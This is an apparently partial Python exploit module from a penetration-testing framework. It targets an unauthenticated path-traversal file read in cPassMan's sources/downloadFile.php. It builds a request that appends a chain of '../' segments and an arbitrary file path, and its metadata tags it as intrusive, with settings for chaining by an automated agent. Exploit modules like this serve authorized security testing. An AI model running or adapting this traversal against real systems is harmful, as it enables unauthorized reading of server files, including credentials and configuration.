#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Reads arbitrary files via cPassMan sources/downloadFile."""
...
class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'cPassMan - downloadFile.php File Read',
        'description': (
            'Reads arbitrary files via cPassMan sources/downloadFile.php path traversal.'
        ),
        ...
        'tags': ['cpassman', 'lfi', 'file-read', 'unauth'],
        'agent': {
            'risk': 'intrusive',
            ...
            'chain': {
                ...
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cpassman_downloadfile_lfi_detect'],
            },
        },
    }
    ...
    base_path = OptString('', 'cPassMan base path', required=False)

    def execute(self, file_path: str) -> str:
        remote = str(file_path or '').strip().lstrip('/')
        base = str(self.base_path or '').rstrip('/')
        path = f'{base}/sources/downloadFile.php?path=../../../../../../../{remote}'
